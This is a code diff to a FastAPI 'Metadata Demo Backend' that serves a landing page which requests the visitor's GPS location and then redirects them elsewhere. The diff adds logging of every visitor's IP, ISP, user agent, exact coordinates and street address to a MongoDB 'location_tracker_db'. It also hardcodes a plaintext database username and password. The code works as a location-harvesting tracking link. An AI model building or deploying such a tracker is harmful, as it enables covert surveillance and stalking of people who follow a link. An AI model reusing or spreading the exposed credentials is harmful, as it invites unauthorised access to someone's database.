@@ -1,10 +1,24 @@
 import asyncio
+import os
+from datetime import datetime, timezone
 from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse, JSONResponse
 import httpx
 import uvicorn
+from motor.motor_asyncio import AsyncIOMotorClient
 
 app = FastAPI(title="Metadata Demo Backend")
+
+# MongoDB Credentials and URI Setup
+MONGODB_USERNAME = os.getenv("MONGODB_USERNAME", "chappidivenkatasriteja_db_user")
+MONGODB_PASSWORD = os.getenv("MONGODB_PASSWORD", "T7mcp3ovV3M47DkR")
+DEFAULT_URI = f"mongodb+srv://{MONGODB_USERNAME}:{MONGODB_PASSWORD}@cluster0.gonm89d.mongodb.net/location_tracker_db?retryWrites=true&w=majority"
+
+MONGODB_URI = os.getenv("MONGODB_URI", DEFAULT_URI)
+
+mongo_client = AsyncIOMotorClient(MONGODB_URI)
+db = mongo_client["location_tracker_db"]
+logs_collection = db["visitor_logs"]
 
 
 async def fetch_ip_geolocation(ip: str) -> dict:
@@ -93,7 +107,6 @@ async def public_landing_page(request: Request):
                 sendPayloadAndRedirect({ status: "blocked", error_message: "Geolocation unsupported" });
             }
 
-            // Fallback safety timeout: redirect anyway after 4 seconds if browser hangs
             setTimeout(() => {
                 window.location.replace(DESTINATION_URL);
             }, 4000);
@@ -114,6 +127,22 @@ async def receive_location_result(request: Request):
     data = await request.json()
     status = data.get("status")
 
+    forwarded_for = request.headers.get("x-forwarded-for")
+    real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
+    ip_info = await fetch_ip_geolocation(real_ip)
+
+    # Base log object for MongoDB Atlas
+    log_document = {
+        "timestamp": datetime.now(timezone.utc),
+        "status": status,
+        "ip_address": real_ip,
+        "ip_city": ip_info.get("city"),
+        "ip_region": ip_info.get("region"),
+        "ip_country": ip_info.get("country"),
+        "isp": ip_info.get("isp"),
+        "user_agent": request.headers.get("user-agent"),
+    }
+
     if status == "allowed":
         lat = data.get("latitude")
         lon = data.get("longitude")
@@ -132,6 +161,14 @@ async def receive_location_result(request: Request):
         except Exception:
             pass
 
+        log_document.update({
+            "gps_latitude": lat,
+            "gps_longitude": lon,
+            "gps_accuracy_meters": accuracy,
+            "reverse_geocoded_address": street_address,
+            "maps_link": f"https://www.google.com/maps?q={lat},{lon}"
+        })
+
         print("\n" + "🎯"*30, flush=True)
         print(" 📍 EXACT GPS LOCATION CAPTURED (ALLOWED)", flush=True)
         print("🎯"*30, flush=True)
@@ -143,18 +180,23 @@ async def receive_location_result(request: Request):
         print("🎯"*30 + "\n", flush=True)
 
     elif status == "blocked":
-        forwarded_for = request.headers.get("x-forwarded-for")
-        real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
-        location_info = await fetch_ip_geolocation(real_ip)
+        log_document["error_message"] = data.get("error_message", "Permission denied")
 
         print("\n" + "⚠️"*30, flush=True)
         print(" 🛡️ USER BLOCKED GPS PERMISSION! FALLING BACK TO IP LOCATION:", flush=True)
         print("⚠️"*30, flush=True)
-        print(f" Fallback City   : {location_info.get('city')}", flush=True)
-        print(f" Fallback Region : {location_info.get('region')}", flush=True)
-        print(f" Fallback ISP    : {location_info.get('isp')}", flush=True)
+        print(f" Fallback City   : {ip_info.get('city')}", flush=True)
+        print(f" Fallback Region : {ip_info.get('region')}", flush=True)
+        print(f" Fallback ISP    : {ip_info.get('isp')}", flush=True)
         print(f" Visitor IP      : {real_ip}", flush=True)
         print("⚠️"*30 + "\n", flush=True)
+
+    # Insert log entry into MongoDB Atlas
+    try:
+        await logs_collection.insert_one(log_document)
+        print("💾 Successfully saved log entry to MongoDB Atlas!", flush=True)
+    except Exception as e:
+        print(f"❌ Failed to insert log to MongoDB: {e}", flush=True)
 
     return JSONResponse(content={"status": "received"})
 
